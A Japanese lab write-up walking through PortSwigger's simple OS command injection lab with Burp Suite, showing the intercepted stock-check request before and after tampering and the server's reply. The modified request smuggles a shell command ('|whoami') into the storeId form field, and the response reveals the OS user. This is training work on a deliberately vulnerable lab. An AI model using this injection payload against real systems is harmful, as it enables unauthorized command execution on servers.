# OS コマンドインジェクション

OS コマンドインジェクション
以下のハッキングラボで OS コマンドインジェクションを試します。
https://portswigger.net/web-security/os-command-injection/lab-simple

- 1. Burp Suite を起動し、Proxy タブからブラウザうを起動します
- 2. 上記 URL にアクセスします
- 3. 任意の商品ページにアクセスします
     ![1](https://github.com/pea-sys/Til/assets/49807271/a79b8a2a-4f9b-425a-98f4-2a734a889c44)

- 4. Intercept on にします。
- 5. 在庫チェックボタンを押下
     ![2](https://github.com/pea-sys/Til/assets/49807271/bce3dd1e-a1da-4354-8ca8-229b07e9b633)
- 6. リクエストを書き換えます

[変更前]

```
POST /product/stock HTTP/2
Host: 0a64008e03fd2fef811e57a900d6007a.web-security-academy.net
Cookie: session=1w0g1mzKh13PM3B4Cz52NlOEoYDOSMyi
Content-Length: 21
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a64008e03fd2fef811e57a900d6007a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a64008e03fd2fef811e57a900d6007a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

productId=1&storeId=1
```

[変更後]

```
POST /product/stock HTTP/2
Host: 0a64008e03fd2fef811e57a900d6007a.web-security-academy.net
Cookie: session=1w0g1mzKh13PM3B4Cz52NlOEoYDOSMyi
Content-Length: 21
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a64008e03fd2fef811e57a900d6007a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a64008e03fd2fef811e57a900d6007a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

productId=1&storeId=1|whoami
```

- 7. Intercept off にすると、OS へのログインユーザーが得られます

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-wUEBMX
```
